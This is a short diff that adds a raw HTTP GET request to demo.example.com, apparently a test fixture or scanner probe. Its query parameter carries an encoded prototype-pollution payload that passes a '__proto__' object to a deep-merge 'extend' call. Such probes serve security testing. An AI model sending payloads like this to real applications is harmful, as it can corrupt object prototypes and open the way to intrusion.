@@ -1,0 +1,4 @@
+GET /a?page=extend(true,{},{%26quot;__proto__%26quot;:{%26quot;x%26quot;:1}}) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
